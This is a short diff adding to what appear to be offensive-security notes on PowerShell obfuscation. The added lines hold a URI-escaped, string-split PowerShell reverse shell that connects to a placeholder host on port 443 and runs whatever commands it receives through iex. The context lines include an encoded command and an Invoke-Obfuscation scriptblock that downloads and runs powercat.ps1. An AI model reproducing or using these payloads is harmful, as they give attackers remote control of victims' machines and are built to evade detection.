@@ -19,6 +19,14 @@ JwB0AGUAcwB0AC4AYwBvAG0AJwA=
 powershell.exe -encodedCommand JwB0AGUAcwB0AC4AYwBvAG0AJwA=
 test.com
 
+
+#Powershell encode from file
+#EscapeUriString
+PS> $s=cat file.txt
+PS> [system.uri]::EscapeUriString($s)
+$client%20=%20.('N'+'ew-Objec'+'t')%20SYSTem.Net.SoCKETS.TcpCLIent(('x.'+'x'+'.x.x'+'x'),443);$stream%20=%20$client.GetStREam();[byte[]]$bytes%20=%200..65535%7C.('%25')%7B0%7D;while(($i%20=%20$stream.REAd($bytes,%200,%20$bytes.LEnGtH))%20-ne%200)%7B;$data%20=%20(&('Ne'+'w'+'-Obj'+'ect')%20-TypeName%20sySTeM.tExt.aScIiEnCodiNg).GEtStrInG($bytes,0,%20$i);$sendback%20=%20(.('i'+'ex')%20$data%202%3E&1%20%7C%20.('Out-S'+'t'+'ri'+'ng')%20);$sendback2%20%20=%20$sendback%20+%20('P'+'S%20')%20+%20(&('p'+'wd')).PatH%20+%20'%3E%20';$sendbyte%20=%20([text.encoding]::asCIi).GEtByTeS($sendback2);$stream.writE($sendbyte,0,$sendbyte.LENGth);$stream.FluSh()%7D;$client.cLOsE()
+
+
 Invoke-Obfuscation>
 set scriptblock Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/powercat.ps1')
 Invoke-Obfuscation> test
